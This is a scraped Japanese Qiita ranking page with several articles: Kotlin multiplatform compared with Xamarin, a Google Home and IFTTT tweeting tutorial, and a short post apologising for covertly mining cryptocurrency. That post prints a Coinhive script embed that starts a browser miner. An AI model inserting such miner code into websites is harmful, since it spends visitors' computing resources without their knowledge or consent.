    <span class="n">actual</span> <span class="k">fun</span> <span class="nf">getMinutes</span><span class="p">()</span> <span class="p">=</span> <span class="n">calendar</span><span class="p">[</span><span class="n">MINUTE</span><span class="p">]</span>
    <span class="n">actual</span> <span class="k">fun</span> <span class="nf">getTime</span><span class="p">():</span> <span class="n">Number</span> <span class="p">=</span> <span class="n">calendar</span><span class="p">.</span><span class="n">timeInMillis</span>

    <span class="k">override</span> <span class="k">fun</span> <span class="nf">equals</span><span class="p">(</span><span class="n">other</span><span class="p">:</span> <span class="n">Any</span><span class="p">?):</span> <span class="n">Boolean</span> <span class="p">=</span> <span class="n">other</span> <span class="k">is</span> <span class="n">Date</span> <span class="p">&amp;&amp;</span> <span class="n">other</span><span class="p">.</span><span class="n">calendar</span><span class="p">.</span><span class="n">time</span> <span class="p">==</span> <span class="n">calendar</span><span class="p">.</span><span class="n">time</span>
<span class="p">}</span>

<span class="err">＜以下省略＞</span>
</pre></div></div>

<p>Android では Java SE API が使用できるので、 <code>java.util.Date</code> や <code>java.util.Calendar</code> を使用して実装をしています。 expect に対してこちらには <code>actual</code> というキーワードが付いていますね。</p>

<p>さらに、 <a href="https://github.com/JetBrains/kotlinconf-app/blob/master/common-jvm/build.gradle" rel="nofollow noopener" target="_blank"><code>common-jvm/build.gradle</code></a> には、</p>

<div class="code-frame" data-lang="java"><div class="highlight"><pre><span></span><span class="n">apply</span> <span class="n">plugin</span><span class="o">:</span> <span class="err">'</span><span class="n">kotlin</span><span class="o">-</span><span class="n">platform</span><span class="o">-</span><span class="n">jvm</span><span class="err">'</span>
<span class="n">apply</span> <span class="n">plugin</span><span class="o">:</span> <span class="err">'</span><span class="n">kotlinx</span><span class="o">-</span><span class="n">serialization</span><span class="err">'</span>

<span class="n">dependencies</span> <span class="o">{</span>
    <span class="n">compile</span> <span class="s">"org.jetbrains.kotlin:kotlin-stdlib-jre8:$kotlin_version"</span>
    <span class="n">compile</span> <span class="s">"org.jetbrains.kotlinx:kotlinx-serialization-runtime:$serialization_version"</span>
    <span class="n">testCompile</span> <span class="s">"junit:junit:4.12"</span>
    <span class="n">testCompile</span> <span class="s">"org.jetbrains.kotlin:kotlin-test-junit:$kotlin_version"</span>
    <span class="n">testCompile</span> <span class="s">"org.jetbrains.kotlin:kotlin-test:$kotlin_version"</span>
    <span class="n">expectedBy</span> <span class="nf">project</span><span class="o">(</span><span class="s">":common"</span><span class="o">)</span>
<span class="o">}</span>

<span class="err">＜</span><span class="n">以下省略</span><span class="err">＞</span>
</pre></div></div>

<p><code>expectedBy project(":common")</code> という記述があり、これが「common プロジェクトで期待された実際のコードである」ことを定義しています。これがビルドシステムによって解釈され、空っぽの <code>common/Date</code>  クラスが <code>common-jvm/Date</code> クラスに置き換えられるのでしょう。</p>

<p>同じように iOS 側の Date の実装も…と思ったのですがみつからず（ない？）、さらに他の Date 実装として JavaScript(Kotlin/JS) 側での actual な Date が <a href="https://github.com/JetBrains/kotlinconf-app/blob/master/common-js/src/main/kotlin/JsDate.kt" rel="nofollow noopener" target="_blank"><code>common-js/src/main/kotlin/JsDate.kt</code></a> にありました。</p>

<div class="code-frame" data-lang="kotlin"><div class="highlight"><pre><span></span><span class="k">package</span> <span class="nn">org.jetbrains.kotlinconf</span>

<span class="n">actual</span> <span class="k">external</span> <span class="k">class</span> <span class="nc">Date</span> <span class="p">{</span>
    <span class="n">actual</span> <span class="k">constructor</span><span class="p">()</span>
    <span class="k">constructor</span><span class="p">(</span><span class="n">value</span><span class="p">:</span> <span class="n">Number</span><span class="p">)</span>

    <span class="n">actual</span> <span class="k">fun</span> <span class="nf">getDate</span><span class="p">():</span> <span class="n">Int</span>
    <span class="n">actual</span> <span class="k">fun</span> <span class="nf">getMonth</span><span class="p">():</span> <span class="n">Int</span>
    <span class="n">actual</span> <span class="k">fun</span> <span class="nf">getFullYear</span><span class="p">():</span> <span class="n">Int</span>
    <span class="n">actual</span> <span class="k">fun</span> <span class="nf">getHours</span><span class="p">():</span> <span class="n">Int</span>
    <span class="n">actual</span> <span class="k">fun</span> <span class="nf">getMinutes</span><span class="p">():</span> <span class="n">Int</span>

    <span class="n">actual</span> <span class="k">fun</span> <span class="nf">getTime</span><span class="p">():</span> <span class="n">Number</span>

    <span class="k">companion</span> <span class="k">object</span> <span class="err">{</span>
        <span class="k">fun</span> <span class="nf">parse</span><span class="p">(</span><span class="n">string</span><span class="p">:</span> <span class="n">String</span><span class="p">):</span> <span class="n">Number</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="err">＜以下省略＞</span>
</pre></div></div>

<p>Kotlin/JS では JavaScript の標準APIである <code>Date</code> クラスを使って実装をしていますね。</p>

<p>このように共通な <code>Date</code> クラスを作っておくと、そのクラスは共通なロジック内で使用可能になります。ロジック内で <code>isJVM ? java.util.Date() : isJS ? js.Date() : error</code> (やべ Kotlin に三項演算子ないんだった)などとプラットフォームごとに分岐しなくても、expect な <code>Date</code> クラスの actual な実装は、各プラットフォーム向けのビルド時?に置換されます。</p>

<p>では Xamarin ではどうでしょうか？<br>
Xamarin というか .NET の世界では、 <strong>Bait and switch</strong> というテクニックが一般的なものとして知られています。考え方は Common Module と同じで、「APIが定義されているだけの空っぽのモジュール」を "おとり" にして、「プラットフォーム固有の実装がされた実際のモジュール」 を "喰わせる(=置換する)"、というものです。</p>

<ul>
<li><a href="https://log.paulbetts.org/the-bait-and-switch-pcl-trick/" rel="nofollow noopener" target="_blank">The Bait and Switch PCL Trick</a></li>
<li><a href="http://ticktack.hatenablog.jp/entry/2016/04/08/180321" rel="nofollow noopener" target="_blank">Plugins for Xamarinを作ろう！ - ぴーさんログ</a></li>
<li><a href="https://blog.fenrir-inc.com/jp/2015/12/xamarin_plugin.html" rel="nofollow noopener" target="_blank">共有コードからネイティブ依存処理が使える！PCLを使ったXamarinライブラリ作成テクニック (フェンリル | デベロッパーズブログ)</a></li>
</ul>

<p>Xamarin 向けはもちろん、複数プラットフォーム対応をうたう .NET 製ライブラリの多くはこのテクニックを使って作られています。ただし Bait and switch はビルドシステムやIDEのサポートがあるわけではない、ただのファイル置換を利用したtrickなので、 <code>expect</code> や <code>actual</code> といったキーワードが用意されている Kotlin のそれの方がより洗練されていると言えます。</p>

<h2>
<span id="共通化するためにものすごくたくさんの-common-module-を作らなければならない" class="fragment"></span><a href="#%E5%85%B1%E9%80%9A%E5%8C%96%E3%81%99%E3%82%8B%E3%81%9F%E3%82%81%E3%81%AB%E3%82%82%E3%81%AE%E3%81%99%E3%81%94%E3%81%8F%E3%81%9F%E3%81%8F%E3%81%95%E3%82%93%E3%81%AE-common-module-%E3%82%92%E4%BD%9C%E3%82%89%E3%81%AA%E3%81%91%E3%82%8C%E3%81%B0%E3%81%AA%E3%82%89%E3%81%AA%E3%81%84"><i class="fa fa-link"></i></a>共通化するために、ものすごくたくさんの Common Module を作らなければならない？</h2>

<p>はい、その通りだと思われます。</p>

<p>マルチプラットフォームで動作可能な API は現在のところ <a href="https://kotlinlang.org/api/latest/jvm/stdlib/index.html" rel="nofollow noopener" target="_blank">Kotlin の標準API</a> だけだと推測されます（それらも全てが使えるかは分からないですし）。<br>
実際、「日付」という基本的なクラスでさえ、 Common Module を自作しなければならない、まだ始まったばかりの状態ですから、今マルチプラットフォーム Kotlin を採用したらほとんどの機能は Common Module を作成しなければならないでしょう。</p>

<p>今後、一般的なクラスやよく使用される機能が、Kotlin標準APIセットに拡充されて（あるいは別のライブラリが作られて）、マルチプラットフォーム対応が進むと思われます。</p>

<p>そんな 一般的なクラス、よく使われる機能などが体系的にまとめられて、マルチプラットフォームに対応しているのが <strong>.NET Standard</strong> です。これは、古くは 非Windows向けの.NET Framework である Mono の登場からそれを基盤とした Xamarin や Unity などの隆盛、Linux でも動作する .NET Core のリリースを経て生まれた <strong>共通API セットの仕様</strong> です。</p>

<ul>
<li><a href="https://docs.microsoft.com/ja-jp/dotnet/standard/net-standard" rel="nofollow noopener" target="_blank">.NET Standard | Microsoft Docs</a></li>
<li><a href="http://www.atmarkit.co.jp/ait/articles/1707/28/news033.html" rel="nofollow noopener" target="_blank">特集：マイクロソフトテクノロジーの現在と未来：.NET Standardとは (1/3) - ＠IT</a></li>
</ul>

<p>Kotlin がこれから「共通APIセットの仕様」を考えていくなら、いっそ .NET Standard に乗っかってくれればいいのになーと Xamarin 使いとしては思うわけですが、</p>

<blockquote class="twitter-tweet">
<p>kotlin標準ライブラリ拡充しなきゃ→仕様考えるの面倒じゃね？→ここに.NET Standardというものがあります→もうこれに沿えばいいんじゃね？→Kotlin .NET のできあがりっ、COOL!<br>って世界線に入る条件を教えて未来のenoさん <a href="https://t.co/VMXjHwn2pz" rel="nofollow noopener" target="_blank">https://t.co/VMXjHwn2pz</a></p>— あめい@ハイドラ待ち (@amay077) <a href="https://twitter.com/amay077/status/926685937819684864?ref_src=twsrc%5Etfw" rel="nofollow noopener" target="_blank">2017年11月4日</a>
</blockquote>



<blockquote class="twitter-tweet">
<p>わたしの予知能力では、Java派「iOSでもRoboVMの実装を使い回せば…」Swift派「Swift for AndroidでFoundationを使い回せば…」C# 派「Xamarinなりe4kなりでSystem.*を使えば…」で標準ライブラリ統一戦争になる未来までしか(ry <a href="https://t.co/qNVyfXwMlo" rel="nofollow noopener" target="_blank">https://t.co/qNVyfXwMlo</a></p>— Atsushi Eno (@atsushieno) <a href="https://twitter.com/atsushieno/status/926687187239804929?ref_src=twsrc%5Etfw" rel="nofollow noopener" target="_blank">2017年11月4日</a>
</blockquote>



<p>まあ、 .NET Standard で統一されたらそれこそ .NET のディストピアなので、この混沌の現状こそが我々の望んでいた世界なのかもですね。</p>

<h2>
<span id="開発ツールはどうなるんでしょう" class="fragment"></span><a href="#%E9%96%8B%E7%99%BA%E3%83%84%E3%83%BC%E3%83%AB%E3%81%AF%E3%81%A9%E3%81%86%E3%81%AA%E3%82%8B%E3%82%93%E3%81%A7%E3%81%97%E3%82%87%E3%81%86"><i class="fa fa-link"></i></a>開発ツールはどうなるんでしょう？</h2>

<p>Android は Android Studio を使うわけですけど、 Kotlin/Native や Kotlin/JS は何をつかうのでしょう？ やっぱり <a href="https://www.jetbrains.com/idea/" rel="nofollow noopener" target="_blank">IntelliJ IDEA</a> でしょうか。JetBrains としてはここでマネーを得たい考えなのでしょうかねー。</p>

<p>オープンソースプロダクトの開発者さんは、 「JetBrains のOSS開発者向けライセンス」を得るチャンスがあるので、これを機に取得してみてもよいと思います。</p>

<ul>
<li><a href="https://blog.amay077.net/blog/2017/10/01/renuew_jetbrains_opensource_lisence_2017/" rel="nofollow noopener" target="_blank">JetBrains OpenSource License を更新しました - Experiments Never Fail</a></li>
</ul>

<p>（ Kotlin/Native の IDE は <a href="https://www.jetbrains.com/clion/" rel="nofollow noopener" target="_blank">CLion</a> のようですね。もちろん <a href="http://kotlinlang.org/docs/reference/native-overview.html" rel="nofollow noopener" target="_blank">現段階の情報</a> では。）</p>

<p>※JetBrains OpenSource License は、OSS向けのライセンスですので、OSS活動以外での利用はできません、念のため。</p>

<blockquote class="twitter-tweet">
<p>「JetBrains のOSS開発者向けライセンス」というか「OSSプロジェクト向けライセンス」なので、OSSプロジェクト以外には使えませんので悪しからず</p>— 山本 ユースケ (@yusuke) <a href="https://twitter.com/yusuke/status/927366201746976768?ref_src=twsrc%5Etfw" rel="nofollow noopener" target="_blank">2017年11月6日</a>
</blockquote>



<h2>
<span id="welcome-to-cross-platform-world" class="fragment"></span><a href="#welcome-to-cross-platform-world"><i class="fa fa-link"></i></a>Welcome to Cross-Platform World</h2>

<p>ということで Kotlin のマルチプラットフォーム対応についての感想を Xamarin と比べる形で書いてみました。<br>
Xamarin のそれに比べて Kotlin が秀でているのは、</p>

<ul>
<li>Kotlin という C# よりもモダンな言語が使用できる</li>
<li>Kotlin/JS で Webアプリ もカバーする</li>
</ul>

<p>という点でしょうか。特に後者は Microsoft としては TypeScript を持っているので C# がここに踏み込むことはなさそうです(<a href="https://www.hanselman.com/blog/NETAndWebAssemblyIsThisTheFutureOfTheFrontend.aspx" rel="nofollow noopener" target="_blank">WebAssembly はあると思う</a>)。 Microsoft 自身も Skype アプリを刷新した際に <a href="https://github.com/Microsoft/reactxp" rel="nofollow noopener" target="_blank">ReactXP</a> という React/JS ベースのライブラリを使用している理由として「Xamarin は Webアプリの助けにはならないから」と <a href="https://microsoft.github.io/reactxp/blog/2017/04/06/introducing-reactxp.html" rel="nofollow noopener" target="_blank">言って</a> います。 </p>

<p>このようにクロスプラットフォーム開発ツールといっても、それぞれ得意分野や可・不可領域があり、また現在できることを把握し、将来性を予想しつつ、共通化コードを最大化したいという欲求と戦う必要があります。</p>

<p>ここまで読まれた方なら言わずもがなですが、Kotlin のマルチプラットフォーム対応でも「iOSの知識が必要ない」なんてことは口が裂けても言えないわけで、個別のプラットフォームの知識を習得した上で、それらを共通化するための手法・テクニックを学び、実戦する必要があります。</p>

<p>ということで、 <a href="/AyaseSH" class="user-mention js-hovercard" title="AyaseSH" data-hovercard-target-type="user" data-hovercard-target-name="AyaseSH">@AyaseSH</a> さんのツイートをお借りして締めます、「ようこそクロスプラットフォームへ！」。</p>

<blockquote class="twitter-tweet">
<p>Kotlin でクロスプラットフォームになったことで （辛いことが共有できる）仲間が増えたとしか思わないなー。ようこそクロスプラットフォームへ。</p>— オータガー@ざまりんフレンズ (@AyaseSH) <a href="https://twitter.com/AyaseSH/status/926636856627699717?ref_src=twsrc%5Etfw" rel="nofollow noopener" target="_blank">2017年11月4日</a>
</blockquote>


</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">81位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>117</kbd>
		<a target="_blank" href="https://qiita.com/kazunori279/items/fdadbfde58ed133bb9d5">Google HomeにつぶやくとTwitterでつぶやくやつ、IFTTTですぐできた。</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-10-08<br />07:38:03</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/38290.html">kazunori279</a>(41件の記事)<br />(Google Inc 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/38290/profile-images/1473687710">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[Twitter]</b> <b>[ifttt]</b> <b>[GoogleAssistant]</b> <b>[GoogleHome]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><p>昨日、日本語版の<a href="https://store.google.com/product/google_home" rel="nofollow noopener" target="_blank">Google Home</a>が届いた。</p>

<p><a href="https://camo.qiitausercontent.com/3cf9cf84fb67938c6a48be5492f792f80a376eb5/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33383239302f36343031303162612d303366632d343330382d653664642d6635383666353339383432372e706e67" target="_blank" rel="nofollow noopener"><img width="1256" alt="Screen Shot 2017-10-08 at 6.51.36 AM.png" src="https://camo.qiitausercontent.com/3cf9cf84fb67938c6a48be5492f792f80a376eb5/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33383239302f36343031303162612d303366632d343330382d653664642d6635383666353339383432372e706e67" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/38290/640101ba-03fc-4308-e6dd-f586f5398427.png"></a></p>

<p>このGoogle Homeと<a href="https://ifttt.com/google_assistant" rel="nofollow noopener" target="_blank">IFTTTのGoogle Assistant連携</a>の組み合わせがとても便利そうなので、さっそく試してみた。15分くらいでTwitter連携できた。</p>

<p><a href="https://camo.qiitausercontent.com/2d889277db0a5ba00cd69dbd40895ad7ead59ba1/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33383239302f35393634333565332d363031302d613331392d326430322d3639396533613238663764392e706e67" target="_blank" rel="nofollow noopener"><img width="582" alt="Screen Shot 2017-10-08 at 7.07.54 AM.png" src="https://camo.qiitausercontent.com/2d889277db0a5ba00cd69dbd40895ad7ead59ba1/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33383239302f35393634333565332d363031302d613331392d326430322d3639396533613238663764392e706e67" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/38290/596435e3-6010-a319-2d02-699e3a28f7d9.png"></a></p>

<p>ちなみに、実行するアクションを入れ替えれば、FacebookやSlackにメッセージを送ったり、家電をオンオフしたり、Google Sheetに記録したりと等々、多彩な連携が可能。</p>

<p>以下に連携方法をメモしておく。</p>

<h2>
<span id="google-homeの設定" class="fragment"></span><a href="#google-home%E3%81%AE%E8%A8%AD%E5%AE%9A"><i class="fa fa-link"></i></a>Google Homeの設定</h2>

<p>これは開封後10分くらいで終わる。</p>

<h2>
<span id="iftttのappletを作る" class="fragment"></span><a href="#ifttt%E3%81%AEapplet%E3%82%92%E4%BD%9C%E3%82%8B"><i class="fa fa-link"></i></a>IFTTTのAppletを作る</h2>

<p>まずはIFTTTにサインアップしておく。IFTTTでは「コレをトリガーにアレを実行」ってルール設定を「Applet」と呼んでいる。今回は、Google AssistantをトリガーにTwitterでツイートするAppletを作る。</p>

<p><a href="https://ifttt.com/my_applets" rel="nofollow noopener" target="_blank">IFTTTのMy Applets</a>ページを開き、<code>New Applet</code>をクリック。「コレをトリガーに」を指定する部分で、Google Assistantを選ぶと、以下の選択肢が出て来る。</p>

<p><a href="https://camo.qiitausercontent.com/0aeb98c708efe9c693f8eee869ba1480c91ced12/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33383239302f35393261616164312d353430362d636438362d316238322d3737646362663330633537662e706e67" target="_blank" rel="nofollow noopener"><img width="986" alt="Screen Shot 2017-10-08 at 7.03.19 AM.png" src="https://camo.qiitausercontent.com/0aeb98c708efe9c693f8eee869ba1480c91ced12/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33383239302f35393261616164312d353430362d636438362d316238322d3737646362663330633537662e706e67" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/38290/592aaad1-5406-cd86-1b82-77dcbf30c57f.png"></a></p>

<p>それぞれ、</p>

<ul>
<li>Google Assistantで指定のフレーズを認識</li>
<li>Google Assistantで数値を含む指定のフレーズを認識</li>
<li>Google Assistantでキーワードを含む指定のフレーズを認識</li>
<li>Google Assistantで数値やキーワードを含む指定のフレーズを認識</li>
</ul>

<p>って機能を表す。今回は、キーワード付きのフレーズを認識できる機能<code>Say a phrase with a text ingredient</code>を試してみた。こんな感じだ。</p>

<p><a href="https://camo.qiitausercontent.com/edfb45c45f82516067584e8b43d4f75ce4c21423/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33383239302f37393664343066322d643432342d656538382d333439382d6361306535626237643034382e706e67" target="_blank" rel="nofollow noopener"><img width="565" alt="Screen Shot 2017-10-08 at 7.14.45 AM.png" src="https://camo.qiitausercontent.com/edfb45c45f82516067584e8b43d4f75ce4c21423/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33383239302f37393664343066322d643432342d656538382d333439382d6361306535626237643034382e706e67" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/38290/796d40f2-d424-ee88-3498-ca0e5bb7d048.png"></a></p>

<p>ここで引っかかりポイント。「つぶやく」と発音すると、「つぶやく」「呟く」の2パターンで認識されるのだ。なので、上図のように両方とも登録しておかないとうまく認識されない。ちなみに、このように<code>$</code>記号を使って、つぶやきとして認識したいキーワードを取り出せる。</p>

<p>ちなみに、IFTTTのiOSアプリでは日本語入力がバグっていて使い物にならない。Webページからの設定がおすすめ。</p>

<h2>
<span id="twitter連携設定" class="fragment"></span><a href="#twitter%E9%80%A3%E6%90%BA%E8%A8%AD%E5%AE%9A"><i class="fa fa-link"></i></a>Twitter連携設定</h2>

<p>つづいて、Appletの「アレを実行」部分として、Twitterでつぶやくルールを以下のように指定する。</p>

<p><a href="https://camo.qiitausercontent.com/93d6bc84965741b4a400cf59f60dd9b324a962c1/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33383239302f65653666373562322d383336642d613430612d663138342d3666333437363435663536312e706e67" target="_blank" rel="nofollow noopener"><img width="526" alt="Screen Shot 2017-10-08 at 7.18.55 AM.png" src="https://camo.qiitausercontent.com/93d6bc84965741b4a400cf59f60dd9b324a962c1/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33383239302f65653666373562322d383336642d613430612d663138342d3666333437363435663536312e706e67" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/38290/ee6f75b2-836d-a40a-f184-6f347645f561.png"></a></p>

<p>ここは好きなテキストをいれてよいが、{{TextField}}ってのを入れた場所にGoogle Assistantで認識したキーワードを挿入できる。</p>

<p>以上。最後に<code>Finish</code>ボタンをクリックしてAppletを登録すると完成。すぐ試せる。</p>

<h2>
<span id="テストデバッグ" class="fragment"></span><a href="#%E3%83%86%E3%82%B9%E3%83%88%E3%83%87%E3%83%90%E3%83%83%E3%82%B0"><i class="fa fa-link"></i></a>テスト＆デバッグ</h2>

<p>Google Homeに向かって、「OK Google, インターネットで これはテスト とつぶやく」のように話しかけると、うまく行けば数秒でTwitter上にツイートが現れる。成功だ。</p>

<p>つぶやくキーワードが短いと成功しやすいけど、長い文だとあまりうまく動いてくれない。デバッグしたい場合は、Google Homeアプリのマイアクティビティが便利。認識に失敗した場合もすべてここにログとして残る。</p>

<p><a href="https://camo.qiitausercontent.com/a0900d0e44b443a431c7544c0a5b5e0286b9a266/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33383239302f36373766616432652d633332372d306463372d346638302d6165303430393137336261652e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/a0900d0e44b443a431c7544c0a5b5e0286b9a266/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33383239302f36373766616432652d633332372d306463372d346638302d6165303430393137336261652e706e67" alt="IMG_0115.PNG" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/38290/677fad2e-c327-0dc7-4f80-ae0409173bae.png"></a></p>

<p>ちなみに、今回のようにキーワードを含む文章を認識するルールを使うと、認識の成功率はあんまり高くない。日々の生活で使うなら、固定文をトリガーに固定文をつぶやくルールの方が実用性はよさそうだ。</p>

<h2>
<span id="ifttt連携は使える" class="fragment"></span><a href="#ifttt%E9%80%A3%E6%90%BA%E3%81%AF%E4%BD%BF%E3%81%88%E3%82%8B"><i class="fa fa-link"></i></a>IFTTT連携は使える</h2>

<p>IFTTTはいろいろなサービスやデバイスとの連携をサポートしているので、Twitter以外にもいろいろ遊んでみたくなる。例えば、</p>

<ul>
<li>FacebookやSlackなどにメッセージ送信</li>
<li>
<a href="https://shop.littlebits.cc/products/cloudbit" rel="nofollow noopener" target="_blank">littleBits</a>でおうちIoT連携</li>
<li>WeMoで家電のオンオフ</li>
<li>Google Sheetに音声メモ記録</li>
<li>Gmailでメール送信</li>
</ul>

<p>といったところがすぐに思いつく。</p>

<p>Google Home＋IFTTT連携、お手軽すぎるので皆さんもお試しあれ。</p>

<hr>

<p>Disclaimer この記事は個人的なものです｡ここで述べられていることは私の個人的な意見に基づくものであり､私の雇用者には関係はありません｡</p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">82位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>115</kbd>
		<a target="_blank" href="https://qiita.com/axis06/items/ccad6b372bd7b8d467b8">【謝罪】皆様が利用している間に、コインマイニングしていた話【Coinhive】</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-09-21<br />17:20:30</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/69141.html">axis06</a>(3件の記事)<br />(DiverFront,Inc 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/69141/profile-images/1494929586">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[JavaScript]</b> <b>[Bitcoin]</b> <b>[Coinhive]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><p>まだ、1時間でサービス開発を読んでない方はこちら。<br>
<a href="https://qiita.com/axis06/items/49ba9360aea181b536e8" id="reference-559cb87576c2f6a8c8dc">iOS11でWebRTCを利用したアプリを1時間で作った話 - Qiita</a><br>
<a href="https://camo.qiitausercontent.com/008561eabdcbd87d10273a882f2046b599b1c218/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f36393134312f65333761643835612d353937322d636161322d333061312d3235646330316633636662632e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/008561eabdcbd87d10273a882f2046b599b1c218/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f36393134312f65333761643835612d353937322d636161322d333061312d3235646330316633636662632e706e67" alt="ogp.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/69141/e37ad85a-5972-caa2-30a1-25dc01f3cfbc.png"></a></p>

<p>累計利用者数１０００人以上の方々ありがとうございました。</p>

<h2>
<span id="coinhive" class="fragment"></span><a href="#coinhive"><i class="fa fa-link"></i></a>CoinHive</h2>

<p><a href="https://gyazo.com/0bcb11c7eb16171f86a00c910e3e26fa" rel="nofollow noopener" target="_blank"><img src="https://camo.qiitausercontent.com/aae6f6ef0e4209f3c2e6b693ba21f027bc55dea7/68747470733a2f2f692e6779617a6f2e636f6d2f30626362313163376562313631373166383661303063393130653365323666612e706e67" alt="https://gyazo.com/0bcb11c7eb16171f86a00c910e3e26fa" data-canonical-src="https://i.gyazo.com/0bcb11c7eb16171f86a00c910e3e26fa.png"></a></p>

<p><a href="https://coin-hive.com/" class="autolink" rel="nofollow noopener" target="_blank">https://coin-hive.com/</a></p>

<p>サービス開発中に広告を出すか悩んでいたとき、Twitterでこのサービスを見つけました。<br>
これは皆様がウェブを見ているときのリソースの一部で仮想通貨をマイニングするサービスです。</p>

<h2>
<span id="使い方" class="fragment"></span><a href="#%E4%BD%BF%E3%81%84%E6%96%B9"><i class="fa fa-link"></i></a>使い方</h2>

<div class="code-frame" data-lang="html"><div class="highlight"><pre><span></span>
<span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">"https://coin-hive.com/lib/coinhive.min.js"</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
    <span class="kd">var</span> <span class="nx">miner</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">CoinHive</span><span class="p">.</span><span class="nx">Anonymous</span><span class="p">(</span><span class="s1">'&lt;site-key&gt;'</span><span class="p">);</span>
    <span class="nx">miner</span><span class="p">.</span><span class="nx">start</span><span class="p">();</span>
<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</pre></div></div>

<p>これだけ。</p>

<h2>
<span id="本題" class="fragment"></span><a href="#%E6%9C%AC%E9%A1%8C"><i class="fa fa-link"></i></a>本題</h2>

<p>さて今回どれくらい稼げたでしょうか。</p>

<p>それは</p>

<p>なんと</p>

<p><em>0.00015    XMR</em></p>

<p>ドルにすると</p>

<p><em>0.0141429180USD</em></p>

<p>日本円にすると</p>

<p>1.12676056 円</p>

<h1>
<span id="まとめ" class="fragment"></span><a href="#%E3%81%BE%E3%81%A8%E3%82%81"><i class="fa fa-link"></i></a>　まとめ</h1>

<p>僕の時給は1円でした。</p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">83位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>110</kbd>
		<a target="_blank" href="https://qiita.com/sinmetal/items/7c6e146fbad8ff8a0f5a">DatastoreとFirestoreとApp Engineの関連</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-10-05<br />23:54:58</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/15640.html">sinmetal</a>(37件の記事)<br />(メルカリ/ソウゾウ 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/15640/profile-images/1474548897">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[GoogleAppEngine]</b> <b>[GoogleCloudPlatform]</b> <b>[Firebase]</b> <b>[GoogleCloudDatastore]</b> <b>[GoogleCloudFirestore]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
